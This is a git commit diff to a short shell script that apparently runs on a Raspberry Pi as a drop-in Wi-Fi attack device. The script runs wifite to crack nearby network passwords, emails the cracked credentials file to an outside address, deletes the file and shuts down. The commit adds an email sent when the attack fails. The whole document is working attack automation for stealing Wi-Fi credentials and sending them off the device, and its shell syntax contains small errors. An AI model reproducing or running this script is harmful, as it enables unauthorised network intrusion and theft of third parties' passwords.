544ff8b141d099ce5eeeaa9f7ba42d471829b623
Hariss Ali Gills <harissgills@gmail.com>
2022-01-21 22:43:05 +0000

    Added when no file is found

--- script.sh
+++ script.sh
@@ -2,7 +2,13 @@
 sleep 30s
 wifite -p 60 --kill
 systemctl start postfix
-sendEmail -f pifi@attcking.pi -t username@email.com -u "Pa$$W0RD$" -a cracked.json
+my_address = username@email.com
+if [ ! -f cracked.json]
+then
+	sendEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
+else 
+    sendEmail -f pifi@attcking.pi -t $my_address -u "Pa$$W0RD$" -a cracked.json
+fi
 systemctl stop postfix
 rm cracked.json
 shutdown now
